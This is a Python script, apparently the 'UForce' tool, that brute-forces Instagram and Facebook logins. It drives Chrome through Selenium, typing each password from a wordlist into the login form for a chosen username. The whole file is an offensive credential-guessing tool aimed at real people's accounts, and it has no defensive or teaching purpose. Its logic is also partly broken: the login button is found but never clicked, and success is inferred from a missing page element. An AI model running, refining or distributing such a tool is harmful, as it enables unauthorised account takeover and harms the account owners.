# Coded by u2ru
# https://github.com/u2ru/UForce

import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

parser = OptionParser()
now = datetime.datetime.now()

print(sys.version)

# Colors
class color:
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   CWHITE  = '\33[37m'

#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()

menuopts = {
    0: {
        "site": "https://www.instagram.com/accounts/login/",
        "login_sel": "input[name='username']",
        "pass_sel": "input[name='password']",
        "enter_sel": "#react-root > section > main > div > article > div > div:nth-child(1) > div > form > div:nth-child(3) > button"
    },
    1: {
        "site": "https://www.facebook.com/login/",
        "login_sel": "#email",
        "pass_sel": "#pass",
        "enter_sel": "#loginbutton"
    }
}

CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'

def wizard():
    menu = "1.instagram\n2.facebook"
    print (menu)
    chooseMenu = raw_input("Choose website to bruteforce: ")
    website = menuopts.get(int(chooseMenu) - 1).get('site')
    sys.stdout.write('Checking if website exists ')
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print ("[OK]")
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print ("User used Ctrl+C to exit...")
        exit()
    except:
        t.sleep(1)
        print ("[X]")
        t.sleep(1)
        print ("Website could not be located make sure to use http / https")
        exit()
    
    username = raw_input("Enter username/mail: ")
    pass_list = raw_input('Enter a directory to a password list: (pass.txt <- default)') or "pass.txt"
    starter(username, menuopts.get(int(chooseMenu) - 1).get('login_sel'), menuopts.get(int(chooseMenu) - 1).get('pass_sel'), menuopts.get(int(chooseMenu) - 1).get('enter_sel'), pass_list, menuopts.get(int(chooseMenu) - 1).get('site'))

def starter(username, user_log, user_pas, sel_login, pass_list, website):
    passlist = open(pass_list, 'r')
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1 # counterStrike )))))
    browser = webdriver.Chrome(CHROME_DVR_DIR)
    while True:
        try:
            for line in passlist:
                browser.get(website)
                t.sleep(1)
                Selector_u = browser.find_element_by_css_selector(user_log)
                Selector_p = browser.find_element_by_css_selector(user_pas) # Finds by Selector
                enter = browser.find_element_by_css_selector(sel_login)

                Selector_u.send_keys(username)
                Selector_p.send_keys(line)
                t.sleep(10)
                print ("----====--=+=--====----")
                print (color.GREEN + 'Tried password: ' + color.RED + line + color.GREEN + "\nFor user: " + color.RED + username)
                print ("----====--=+=--====----")
                temp = line
        except KeyboardInterrupt:
            print ("User used Ctrl+C to exit...")
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print ('THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print (color.GREEN + 'Password has been found: ' + temp)
            exit()

wizard()